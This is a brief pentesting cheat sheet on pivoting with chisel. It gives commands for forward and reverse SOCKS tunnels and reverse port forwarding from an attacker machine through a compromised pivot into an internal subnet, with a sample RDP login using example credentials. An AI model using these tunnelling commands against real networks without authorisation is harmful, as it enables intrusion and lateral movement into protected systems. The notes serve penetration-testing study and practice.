# How to Chisel Forward 
(aka Pivot allow Incoming traffic)
(if we have access to Pivot that have access to an Internal subnet, we use this to be able to reach that subnet from the Outside)
`./chisel server -v -p 1234 --socks5`
(Setup a a chisel server on the Pivot)
`./chisel client -v CHISELSEVER:1234 socks`
(Setup a chisel client on the Attacker that points to the chisel server IP aka Pivot machine)
`socks5 127.0.0.1 1080`
(Add to the local proxychain)
Example: `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
(From the attacker you should be able to connect to the subnet 172 aka Internal via Chisel server on the Pivot machine that have naturally access to it)


# How to Chisel Reverse 
(aka Pivot deny Incoming traffic)
(If a firewall blocks incoming traffic on the Pivot then you can use this method)
`sudo ./chisel server --reverse -v -p 1234 --socks5`
(Setup a chisel server listening on Attacker machine)
`./chisel client -v CHISELSEVER:1234 R:socks`
(Setup a chisel client on Pivot machine)
`socks5 127.0.0.1 1080`
(Add to the local proxychain)
`proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
(From the attacker you should be able to connect to the subnet 172 aka Internal)


# How to Reverse PortFW 
(Useful if we want to sniff back a response from a victim that is only accessible via Pivot all the way back to us via PIVOT!)
`./chisel server --reverse --port 1234`
(Setup a chisel server listening on Attacker machine)
`./chisel client -v CHISELSEVER:1234 R:8001:127.0.0.1:8001 R:8443:127.0.0.1:8443`
(Setup a chisel client on Pivot machine. This will forward back those 127.xxxx:8001 to us via localhost:8001)
